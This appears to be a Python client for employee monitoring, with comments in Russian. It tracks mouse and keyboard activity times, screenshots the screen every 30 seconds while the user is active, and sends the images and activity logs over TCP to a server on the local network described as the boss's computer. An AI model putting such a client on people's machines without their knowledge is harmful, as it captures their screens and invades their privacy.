import time
import os
import socket
from datetime import datetime
from pynput import mouse, keyboard
import pyautogui
import sys

# ========== Конфигурация клиента ==========
SERVER_HOST = "192.168.0.174"   # IP компьютера босса (замените)
SERVER_PORT = 12345
COMPUTER_NAME = socket.gethostname()   

# ========== Остальной код без изменений ==========
SAVE_DIR = "screenshots"
os.makedirs(SAVE_DIR, exist_ok=True)

last_activity_time = time.time()

def on_move(x, y):
    global last_activity_time
    last_activity_time = time.time()

def on_click(x, y, button, pressed):
    global last_activity_time
    last_activity_time = time.time()

def on_press(key):
    global last_activity_time
    last_activity_time = time.time()

mouse_listener = mouse.Listener(on_move=on_move, on_click=on_click)
keyboard_listener = keyboard.Listener(on_press=on_press)
mouse_listener.start()
keyboard_listener.start()

# ========== Новая функция отправки лога ==========
def send_log(message):
    """Отправляет строку лога на сервер"""
    date_str = datetime.now().strftime("%Y-%m-%d")
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_line = f"{timestamp} - {message}"
    # Формируем данные: имя_компа\дата\строка_лога
    data = f"{COMPUTER_NAME}\n{date_str}\n{log_line}".encode()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((SERVER_HOST, SERVER_PORT))
        # Отправляем команду "LOG"
        sock.send(b"LOG")
        # Отправляем длину данных (4 байта)
        sock.send(len(data).to_bytes(4, 'big'))
        sock.send(data)
        # Ждём подтверждения
        resp = sock.recv(2)
        sock.close()
        if resp == b"OK":
            print("  [Отправлено] Лог на сервер")
        else:
            print("  [Ошибка] Сервер не подтвердил лог")
    except Exception as e:
        print(f"  [Ошибка отправки лога] {e}")

def send_screenshot(filepath):
    """Отправляет файл скриншота на сервер"""
    date_str = datetime.now().strftime("%Y-%m-%d")
    filename = os.path.basename(filepath)
    with open(filepath, "rb") as f:
        img_bytes = f.read()
    # Формируем данные: имя_компа\дата\имя_файла\байты_картинки
    # Чтобы не мучиться с разделителями, просто добавляем байты в конце
    header = f"{COMPUTER_NAME}\n{date_str}\n{filename}\n".encode()
    data = header + img_bytes
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((SERVER_HOST, SERVER_PORT))
        sock.send(b"SCRN")
        sock.send(len(data).to_bytes(4, 'big'))
        sock.send(data)
        resp = sock.recv(2)
        sock.close()
        if resp == b"OK":
            print("  [Отправлено] Скриншот на сервер")
        else:
            print("  [Ошибка] Сервер не подтвердил скриншот")
    except Exception as e:
        print(f"  [Ошибка отправки скриншота] {e}")

# ========== Основной цикл ==========
SCREENSHOT_INTERVAL = 30   # 30 секунд между проверками
IDLE_THRESHOLD = 10        # 10 секунд без активности

while True:
    print(".", end="", flush=True)  # индикатор работы
    current_time = time.time()
    idle_time = current_time - last_activity_time

    if idle_time < IDLE_THRESHOLD:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = os.path.join(SAVE_DIR, f"{timestamp}.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        print(f"\n[+] Скриншот сохранён: {filename}", flush=True)

        # Отправляем лог о том, что сделан скриншот
        send_log(f"Сделан скриншот: {filename}")
        # Отправляем сам скриншот
        send_screenshot(filename)
    else:
        # Пользователь неактивен – отправляем лог об этом (не чаще раза в минуту?)
        # Чтобы не заспамить, можно сохранять статус и отправлять при изменении
        # Но для простоты отправляем каждую итерацию
        send_log("Пользователь неактивен")

    time.sleep(SCREENSHOT_INTERVAL)
